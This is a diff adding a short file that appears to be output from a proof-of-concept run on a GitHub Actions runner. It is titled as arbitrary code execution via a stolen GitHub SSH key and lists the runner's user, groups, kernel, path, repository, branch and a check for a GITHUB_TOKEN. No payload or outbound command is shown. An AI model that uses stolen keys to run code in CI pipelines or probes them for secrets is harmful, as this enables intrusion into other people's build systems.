@@ -1,0 +1,11 @@
+== ARBITRARY CODE EXECUTION via stolen GitHub SSH key ==
+uid=1001(runner) gid=1001(runner) groups=1001(runner),4(adm),100(users),118(docker),999(systemd-journal)
+runner
+runnervmtr4k5
+Linux runnervmtr4k5 6.17.0-1022-azure #22-Ubuntu SMP Mon Jul 27 17:24:03 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+/home/runner/work/labelshop-frontend/labelshop-frontend
+Wed Sep 30 22:55:21 UTC 2026
+== GITHUB CONTEXT ==
+repo=yves45839/labelshop-frontend actor=yves45839 ref=refs/heads/poc-rce-2
+== token scopes (non-secret metadata) ==
+GITHUB_TOKEN present: no
